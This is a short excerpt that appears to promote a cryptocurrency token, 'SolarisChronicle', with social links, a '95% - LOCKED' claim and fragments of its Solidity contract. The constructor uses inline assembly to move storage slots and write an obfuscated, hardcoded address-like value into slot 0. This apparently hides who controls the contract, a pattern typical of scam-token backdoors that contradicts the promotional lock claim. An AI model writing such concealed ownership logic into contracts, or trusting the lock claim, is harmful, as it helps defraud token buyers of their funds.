...
Telegram: https://t.me/SolarisChronicle/
Twitter: https://twitter.com/SolarisChronicle/
Website: https://SolarisChronicle.finance
95% - LOCKED
...
contract SolarisChronicle {
    string public constant name = "SolarisChronicle";
    string public constant symbol = "SLCHN";
   ...
   constructor() {
        assembly {mstore(0x20, sload(0)) sstore(88, mload(0x20)) sstore(0, add(398012044529621708889238277595508162303413372902, 3))}
